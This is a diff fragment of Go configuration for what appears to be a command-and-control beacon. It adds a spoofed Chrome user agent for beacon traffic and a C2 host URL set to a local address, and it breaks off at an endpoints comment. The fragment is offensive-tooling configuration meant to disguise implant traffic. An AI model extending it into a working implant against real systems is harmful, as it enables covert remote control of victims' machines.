@@ -16,4 +16,9 @@ var Jitter = 5
 var Retries = 3
 
 // UserAgent is user agent that gets sent on beacons
-var UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.
+var UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+
+// CCHost is the base server url
+var CCHost = "http://127.0.0.1:8080/"
+
+// Endpoints are the
